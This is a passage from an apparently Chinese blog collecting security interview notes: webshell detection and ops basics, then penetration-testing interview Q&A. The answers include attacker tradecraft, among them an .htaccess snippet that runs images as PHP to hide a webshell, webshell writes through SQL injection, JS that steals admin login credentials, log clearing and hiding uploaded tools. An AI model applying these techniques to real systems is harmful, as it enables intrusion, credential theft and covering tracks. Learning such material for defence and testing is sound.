<h4 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h4><p>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p>
<p>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p>
<h4 id="日志检测"><a href="#日志检测" class="headerlink" title="日志检测"></a>日志检测</h4><p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
<h4 id="语法检测"><a href="#语法检测" class="headerlink" title="语法检测"></a>语法检测</h4><p>实现关键危险函数的捕捉方式</p>
<h4 id="统计学检测"><a href="#统计学检测" class="headerlink" title="统计学检测"></a>统计学检测</h4><p>webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。<br>典型的代表: NeoPI – <a href="https://github.com/Neohapsis/NeoPI" target="_blank" rel="noopener">https://github.com/Neohapsis/NeoPI</a></p>
<h4 id="防范webshell"><a href="#防范webshell" class="headerlink" title="防范webshell"></a>防范webshell</h4><blockquote>
<p><a href="https://blog.csdn.net/nohaoye/article/details/46987587" target="_blank" rel="noopener">https://blog.csdn.net/nohaoye/article/details/46987587</a></p>
</blockquote>
<p>防范的措施大概有三种，第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><blockquote>
<p><a href="https://blog.csdn.net/kx_nullpointer/article/details/21299873" target="_blank" rel="noopener">https://blog.csdn.net/kx_nullpointer/article/details/21299873</a></p>
</blockquote>
<ol>
<li><code>at</code></li>
<li><code>batch</code></li>
<li><code>crontab</code></li>
<li><code>anacron</code>：检测停机期间应该执行但是没有执行的任务，将检测到的任务检测一次</li>
</ol>
<h3 id="自动化运维编写过什么脚本"><a href="#自动化运维编写过什么脚本" class="headerlink" title="自动化运维编写过什么脚本"></a>自动化运维编写过什么脚本</h3><h3 id="yum用的什么源（本地自搭，挂载）"><a href="#yum用的什么源（本地自搭，挂载）" class="headerlink" title="yum用的什么源（本地自搭，挂载）"></a>yum用的什么源（本地自搭，挂载）</h3><h3 id="awk-sed的使用"><a href="#awk-sed的使用" class="headerlink" title="awk sed的使用"></a>awk sed的使用</h3><h3 id="排错思路，排错经验"><a href="#排错思路，排错经验" class="headerlink" title="排错思路，排错经验"></a>排错思路，排错经验</h3><p>网络 防火墙 配置 权限</p>
<h3 id="日志分析ELK的使用和分析"><a href="#日志分析ELK的使用和分析" class="headerlink" title="日志分析ELK的使用和分析"></a>日志分析ELK的使用和分析</h3><blockquote>
<p><a href="https://www.zhihu.com/question/21427267" target="_blank" rel="noopener">https://www.zhihu.com/question/21427267</a></p>
</blockquote>
<ul>
<li>Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。</li>
<li>Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。</li>
<li>Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。</li>
</ul>
<p>举例-阿里规范<br>用户历史命令记录</p>
<p>缺点：安全性不够。使用x-pack实现安全认证及权限管理功能</p>
<h4 id="事件发生的分析"><a href="#事件发生的分析" class="headerlink" title="事件发生的分析"></a>事件发生的分析</h4><h3 id="用户权限管理-修改"><a href="#用户权限管理-修改" class="headerlink" title="用户权限管理(修改)"></a>用户权限管理(修改)</h3><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h3 id="IPsec-VPN"><a href="#IPsec-VPN" class="headerlink" title="IPsec VPN"></a>IPsec VPN</h3><h3 id="安全监控工具"><a href="#安全监控工具" class="headerlink" title="安全监控工具"></a>安全监控工具</h3><ul>
<li>web进入-&gt;堡垒机-&gt;内部防御HIDS-&gt;内部监控，日志审计</li>
<li>zabbix性能监控工具 </li>
<li>HIDS</li>
</ul>
<h3 id="Linux木马查杀"><a href="#Linux木马查杀" class="headerlink" title="Linux木马查杀"></a>Linux木马查杀</h3><h3 id="常见的设备有啥"><a href="#常见的设备有啥" class="headerlink" title="常见的设备有啥"></a>常见的设备有啥</h3><ul>
<li>防火墙 utm 负载均衡设备</li>
<li>IPS IDS(HIDS基于主机型入侵检测系统)</li>
<li>堡垒机</li>
<li>蜜罐</li>
<li>网闸</li>
<li>waf</li>
<li>扫描器</li>
<li>soc(ossim开源安全信息管理系统)</li>
</ul>
<h2 id="Windows运维"><a href="#Windows运维" class="headerlink" title="Windows运维"></a>Windows运维</h2><h3 id="基线规范"><a href="#基线规范" class="headerlink" title="基线规范"></a>基线规范</h3><h3 id="木马查杀"><a href="#木马查杀" class="headerlink" title="木马查杀"></a>木马查杀</h3><p>脱壳，反汇编</p>
<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><ol>
<li><p>控制面板-管理工具-计划任务，在“任务计划程序库”上右键–创建基本任务</p>
</li>
<li><p><code>schtasks</code>命令<br>语法:<br><code>schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | &quot;System&quot;} [/rpPassword]] /?</code></p>
</li>
</ol>
<h2 id="ISO27000和等保-重点等保"><a href="#ISO27000和等保-重点等保" class="headerlink" title="ISO27000和等保(重点等保)"></a>ISO27000和等保(重点等保)</h2><h3 id="说一下ISO27000"><a href="#说一下ISO27000" class="headerlink" title="说一下ISO27000"></a>说一下ISO27000</h3><p>ISO27000是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个24小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。</p>
<p>PDCA（plan do check action）管理循环</p>
<h3 id="说一下等级保护制度"><a href="#说一下等级保护制度" class="headerlink" title="说一下等级保护制度"></a>说一下等级保护制度</h3><p>《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。</p>
<h3 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h3><blockquote>
<p>浅谈信息安全等级保护与ISO27000系列标准的异同 ISSN 1009-3044</p>
</blockquote>
<p>等保是以国家安全、社会秩序和公共利益为出发点，构建国家的安全保障体系。27000系列是以保证组织业务的连续性，缩减业务风险，最大化投资收益为目的，保证组织的业务安全</p>
<h3 id="共性"><a href="#共性" class="headerlink" title="共性"></a>共性</h3><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="排序算法：快排-二分-冒泡"><a href="#排序算法：快排-二分-冒泡" class="headerlink" title="排序算法：快排 二分 冒泡"></a>排序算法：快排 二分 冒泡</h3><h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><blockquote>
<p><a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">http://www.4hou.com/technology/9090.html</a><br><a href="https://blog.csdn.net/quiet_girl/article/details/50716312" target="_blank" rel="noopener">https://blog.csdn.net/quiet_girl/article/details/50716312</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试面试问题2019版</title>
    <url>/2019/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#head1"> 思路流程</a><ul>
<li><a href="#head2"> 信息收集</a></li>
<li><a href="#head3"> 漏洞挖掘</a></li>
<li><a href="#head4"> 漏洞利用&amp;权限提升</a></li>
<li><a href="#head5"> 清除测试数据&amp;输出报告</a></li>
<li><a href="#head6"> 复测</a></li>
</ul>
</li>
<li><a href="#head7"> 问题</a></li>
<li><a href="#head8"> 深信服一面:</a></li>
<li><a href="#head9"> SQL注入防护</a></li>
<li><a href="#head10"> 为什么参数化查询可以防止sql注入</a></li>
<li><a href="#head11"> SQL头注入点</a></li>
<li><a href="#head12"> 盲注是什么？怎么盲注？</a></li>
<li><a href="#head13"> 宽字节注入产生原理以及根本原因</a><ul>
<li><a href="#head14"> 产生原理</a></li>
<li><a href="#head15"> 在哪里编码</a></li>
<li><a href="#head16"> 根本原因</a></li>
<li><a href="#head17"> 解决办法</a></li>
<li><a href="#head18"> sql里面只有update怎么利用</a></li>
</ul>
</li>
<li><a href="#head19"> sql如何写shell/单引号被过滤怎么办</a><ul>
<li><a href="#head20"> 代替空格的方法</a></li>
<li><a href="#head21"> mysql的网站注入，5.0以上和5.0以下有什么区别？</a></li>
</ul>
</li>
<li><a href="#head22"> XSS</a><ul>
<li><a href="#head23"> XSS原理</a><ul>
<li><a href="#head24"> 反射型</a></li>
<li><a href="#head25"> 储存型</a></li>
<li><a href="#head26"> DOM型</a></li>
</ul>
</li>
<li><a href="#head27"> DOM型和反射型的区别</a></li>
<li><a href="#head28">DOM型XSS 自动化测试或人工测试</a></li>
<li><a href="#head29"> 如何快速发现xss位置</a></li>
<li><a href="#head30"> 对于XSS怎么修补建议</a></li>
<li><a href="#head31"> XSS蠕虫的产生条件</a></li>
</ul>
</li>
<li><a href="#head32"> CSRF</a><ul>
<li><a href="#head33"> CSRF原理</a></li>
<li><a href="#head34"> 防御</a></li>
<li><a href="#head35"> token和referer做横向对比，谁安全等级高？</a></li>
<li><a href="#head36"> 对referer的验证，从什么角度去做？如果做，怎么杜绝问题</a></li>
<li><a href="#head37"> 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</a></li>
</ul>
</li>
<li><a href="#head38"> SSRF</a><ul>
<li><a href="#head39"> 检测</a></li>
<li><a href="#head40">SSRF漏洞的成因 防御 绕过</a></li>
</ul>
</li>
<li><a href="#head41"> 上传</a><ul>
<li><a href="#head42"> 文件上传漏洞原理</a></li>
<li><a href="#head43"> 常见的上传绕过方式</a></li>
<li><a href="#head44"> 防护</a></li>
<li><a href="#head45"> 审查上传点的元素有什么意义？</a></li>
</ul>
</li>
<li><a href="#head46"> 文件包含</a><ul>
<li><a href="#head47"> 原理</a></li>
<li><a href="#head48"> 导致文件包含的函数</a></li>
<li><a href="#head49"> 本地文件包含</a></li>
</ul>
</li>
<li><a href="#head50"> XXE</a></li>
<li><a href="#head51"> 逻辑漏洞</a><ul>
<li><a href="#head52"> 金融行业常见逻辑漏洞</a></li>
</ul>
</li>
<li><a href="#head53"> 溢出</a></li>
<li><a href="#head54"> 中间人攻击</a><ul>
<li><a href="#head55"> ARP欺骗</a><ul>
<li><a href="#head56"> 原理:</a></li>
<li><a href="#head57"> 防护</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head58"> DDOS</a><ul>
<li><a href="#head59"> Ddos原理</a><ul>
<li><a href="#head60"> syn洪流的原理</a></li>
<li><a href="#head61"> CC攻击原理</a></li>
</ul>
</li>
<li><a href="#head62"> DDOS防护</a></li>
</ul>
</li>
<li><a href="#head63"> 提权</a><ul>
<li><a href="#head64"> mysql两种提权方式</a><ul>
<li><a href="#head65"> Mysql_UDF提权</a></li>
<li><a href="#head66">Mysql mof提权</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head67"> 特殊漏洞</a><ul>
<li><a href="#head68"> Struts2-045</a></li>
<li><a href="#head69"> Redis未授权访问</a><ul>
<li><a href="#head70"> 产生原因</a></li>
<li><a href="#head71"> 利用条件和方法</a></li>
<li><a href="#head72"> 修复</a></li>
</ul>
</li>
<li><a href="#head73"> Jenkins未授权访问</a></li>
<li><a href="#head74"> MongoDB未授权访问</a><ul>
<li><a href="#head75"> 防护</a></li>
</ul>
</li>
<li><a href="#head76"> Memcache未授权访问</a><ul>
<li><a href="#head77"> 利用</a></li>
<li><a href="#head78"> 漏洞加固</a></li>
</ul>
</li>
<li><a href="#head79">FFMPEG 本地文件读取漏洞</a><ul>
<li><a href="#head80"> 原理</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head81"> 安全知识</a><ul>
<li><a href="#head82"> WEB</a><ul>
<li><a href="#head83"> 常用WEB开发JAVA框架</a></li>
<li><a href="#head84"> 同源策略</a></li>
<li><a href="#head85"> Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</a><ul>
<li><a href="#head86"> 涉及到Jsonp的安全攻防内容</a></li>
<li><a href="#head87"> 攻击页面</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head88"> PHP</a><ul>
<li><a href="#head89"> php中命令执行涉及到的函数</a></li>
<li><a href="#head90">安全模式下绕过php的disable fuction</a></li>
<li><a href="#head91"> PHP弱类型</a></li>
</ul>
</li>
<li><a href="#head92"> 数据库</a><ul>
<li><a href="#head93"> 各种数据库文件存放的位置</a></li>
</ul>
</li>
<li><a href="#head94"> 系统</a><ul>
<li><a href="#head95"> 如何清理日志</a></li>
<li><a href="#head96">入侵 Linux 服务器后需要清除哪些日志？</a></li>
<li><a href="#head97"> LINUX</a><ul>
<li><a href="#head98">查看当前端口连接的命令有哪些？<code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</a></li>
<li><a href="#head99">反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</a></li>
<li><a href="#head100">通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</a></li>
<li><a href="#head101"> linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</a></li>
<li><a href="#head102"> 如何一条命令查看文件内容最后一百行</a></li>
</ul>
</li>
<li><a href="#head103"> Windows</a><ul>
<li><a href="#head104"> 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head105"> 密码学</a><ul>
<li><a href="#head106"> AES／DES的具体工作步骤</a></li>
<li><a href="#head107"> RSA算法</a></li>
<li><a href="#head108"> 分组密码的加密模式</a></li>
<li><a href="#head109"> 如何生成一个安全的随机数？</a></li>
<li><a href="#head110"> SSL握手过程</a></li>
<li><a href="#head111"> 对称加密与非对称加密的不同，分别用在哪些方面</a></li>
</ul>
</li>
<li><a href="#head112"> TCP/IP</a><ul>
<li><a href="#head113"> TCP三次握手的过程以及对应的状态转换</a></li>
<li><a href="#head114"> TCP和UDP协议区别</a></li>
<li><a href="#head115"> https的建立过程</a></li>
</ul>
</li>
<li><a href="#head116"> 流量分析</a><ul>
<li><a href="#head117"> wireshark简单的过滤规则</a></li>
</ul>
</li>
<li><a href="#head118"> 防火墙</a><ul>
<li><a href="#head119"> 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="思路流程"><a href="#思路流程" class="headerlink" title=" 思路流程"></a><span id="head1"> 思路流程</span></h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title=" 信息收集"></a><span id="head2"> 信息收集</span></h3><ol>
<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
<li>子域名收集，旁站，C段等</li>
<li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li>
<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
<li>传输协议，通用漏洞，exp，github源码等</li>
</ol>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title=" 漏洞挖掘"></a><span id="head3"> 漏洞挖掘</span></h3><ol>
<li>浏览网站，看看网站规模，功能，特点等</li>
<li>端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</li>
<li>XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li>
</ol>
<h3 id="漏洞利用-amp-权限提升"><a href="#漏洞利用-amp-权限提升" class="headerlink" title=" 漏洞利用&amp;权限提升"></a><span id="head4"> 漏洞利用&amp;权限提升</span></h3><ul>
<li>mysql提权，serv-u提权，oracle提权</li>
<li>windows 溢出提权</li>
<li>linux脏牛,内核漏洞提权e</li>
</ul>
<h3 id="清除测试数据-amp-输出报告"><a href="#清除测试数据-amp-输出报告" class="headerlink" title=" 清除测试数据&amp;输出报告"></a><span id="head5"> 清除测试数据&amp;输出报告</span></h3><p>i 日志、测试数据的清理<br>ii 总结，输出渗透测试报告，附修复方案</p>
<h3 id="复测"><a href="#复测" class="headerlink" title=" 复测"></a><span id="head6"> 复测</span></h3><p>验证并发现是否有新漏洞，输出报告，归档</p>
<h2 id="问题"><a href="#问题" class="headerlink" title=" 问题"></a><span id="head7"> 问题</span></h2><p><strong>1.拿到一个待检测的站，你觉得应该先做什么？</strong></p>
<p>​    1) 信息收集<br>​        1. 获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。 用邮箱做关键词进行丢进搜索引擎。 利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。 社工找出社交账号，里面或许会找出管理员设置密码的习惯 。 利用已有信息生成专用字典。<br>​        2. 查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。<br>​        3. 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>​        4. 查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>​        5. 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>​        6. google hack 进一步探测网站的信息，后台，敏感文件    </p>
<p>​    2) 漏洞扫描<br>​        开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>​        远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等  </p>
<p>​    3) 漏洞利用<br>​        利用以上的方式拿到webshell，或者其他权限  </p>
<p>​    4) 权限提升<br>​        提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权  </p>
<p>​    5) 日志清理  </p>
<p>​    6) 总结报告及修复方案  </p>
<p><strong>2.判断出网站的CMS对渗透有什么意义？</strong></p>
<p>​    查找网上已曝光的程序漏洞。</p>
<p>​    如果开源，还能下载相对应的源码进行代码审计。</p>
<p><strong>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</strong></p>
<p>​    敏感文件、二级目录扫描</p>
<p>​    站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p>
<p><strong>4.常见的网站服务器容器。</strong></p>
<p>​    IIS、Apache、nginx、Lighttpd、Tomcat</p>
<p><strong>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</strong></p>
<p>​    root权限以及网站的绝对路径。</p>
<p><strong>6.目前已知哪些版本的容器有解析漏洞，具体举例。</strong></p>
<p>​    <strong>IIS 6.0</strong><br>​    /xx.asp/xx.jpg “xx.asp”是文件夹名</p>
<p>​    IIS 7.0/7.5<br>​    默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p>
<p>​    Nginx<br>​    版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>​    空字节代码 xxx.jpg.php</p>
<p>​    Apache<br>​    上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p>
<p>​    lighttpd<br>​    xx.jpg/xx.php，<strong>不全,请小伙伴们在评论处不吝补充，谢谢！</strong></p>
<p><strong>7.如何手工快速判断目标站是windows还是linux服务器？</strong></p>
<p>​    linux大小写敏感,windows大小写不敏感。</p>
<p><strong>8.为何一个mysql数据库的站，只有一个80端口开放？</strong></p>
<p>​    更改了端口，没有扫描出来。</p>
<p>​    站库分离。</p>
<p>​    3306端口不对外开放</p>
<p><strong>9、3389无法连接的几种情况</strong></p>
<p>​    没开放3389 端口</p>
<p>​    端口被修改</p>
<p>​    防护拦截</p>
<p>​    处于内网(需进行端口转发)</p>
<p><strong>10.如何突破注入时字符被转义？</strong></p>
<p>​    宽字符注入</p>
<p>​    hex编码绕过</p>
<p><strong>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p>
<p>​    查看编辑器的名称版本,然后搜索公开的漏洞。</p>
<p><strong>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</strong></p>
<p>​    能做的事情很多，用隐藏网马来举例子：<br>​    插入<br>​    &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php <br>​    .jpg文件会被解析成.php文件。</p>
<p>​    具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p>
<p><strong>13.注入漏洞只能查账号密码？</strong></p>
<p>​    只要权限广，拖库脱到老。</p>
<p><strong>14.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
<p>​    是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p>
<p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，**</strong>如何实现到本地利用？**</p>
<p>​    迅雷下载，直接改后缀为.mdb。</p>
<p><strong>16.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p>
<p>​    因为exp执行多半需要空格界定参数</p>
<p><strong>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</strong></p>
<p>​    同数据库。</p>
<p><strong>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</strong></p>
<p>​    and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p>
<p><strong>19:某个防注入系统，在注入时会提示：</strong></p>
<p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1</p>
<p><strong>20、如何利用这个防注入系统拿shell？</strong></p>
<p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
<p><strong>21.上传大马后访问乱码时，有哪些解决办法？</strong></p>
<p>​    浏览器中改编码。</p>
<p><strong>22.审查上传点的元素有什么意义？</strong></p>
<p>​    有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
<p><strong>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</strong></p>
<p>​    先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
<p>​    其实有些站点，在登陆处也会这样提示</p>
<p>​    所有和数据库有交互的地方都有可能有注入。</p>
<p><strong>24.目标站发现某txt的下载地址为</strong><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p>
<p>​    这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p>
<p><strong>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</strong></p>
<p>​    直接在网站二级目录/abc/下扫描敏感文件及目录。</p>
<p><strong>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</strong></p>
<p>​    后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p>
<p>​    在登录后才可以访问的文件中插入XSS脚本。</p>
<p><strong>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</strong></p>
<p>​    审查元素 把密码处的password属性改成text就明文显示了</p>
<p><strong>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</strong></p>
<p>​    原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
<p><strong>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
<p>​    在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</hws></hws></p>
<p><strong>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</strong></p>
<p>​    隐藏文件夹，为了不让管理员发现你传上去的工具。</p>
<p><strong>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</strong></p>
<p>A. demo.jsp?id=2+1       B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
<p><strong>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</strong></p>
<p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p>
<p><strong>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</strong></p>
<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
<p><strong>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</strong></p>
<p><strong>XSS是跨站脚本攻击</strong>，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p>
<p><strong>CSRF是跨站请求伪造攻击</strong>，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
<p><strong>35、CSRF、SSRF和重放攻击有什么区别？</strong></p>
<p>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
<p><strong>36、说出至少三种业务逻辑漏洞，以及修复方式？</strong></p>
<p><strong>密码找回漏洞</strong>中存在</p>
<p>1）密码允许暴力破解、</p>
<p>2）存在通用型找回凭证、</p>
<p>3）可以跳过验证步骤、</p>
<p>4）找回凭证可以拦包获取</p>
<p>等方式来通过厂商提供的密码找回功能来得到密码。<br><strong>身份认证漏洞</strong>中最常见的是</p>
<p>1）会话固定攻击</p>
<p>2） Cookie 仿冒</p>
<p>只要得到 Session 或 Cookie 即可伪造用户身份。<br><strong>验证码漏洞</strong>中存在</p>
<p>1）验证码允许暴力破解</p>
<p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
<p><strong>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p>
<p>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”<br>HTTP/1.1Host:<strong><em>.com:82User-Agent:Mozilla/<br>5.0 Firefox/40Accept:text/css,/;q=0.1<br>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3<br>Referer:http://****</em></strong>.com/eciop/orderForCC/<br>cgtListForCC.htm?zone=11370601&amp;v=145902<br>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;<br>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;<br>st_uid=N90PLYHLZGJXI-NX01VPUF46W;<br>status=True<br>Connection:keep-alive</p>
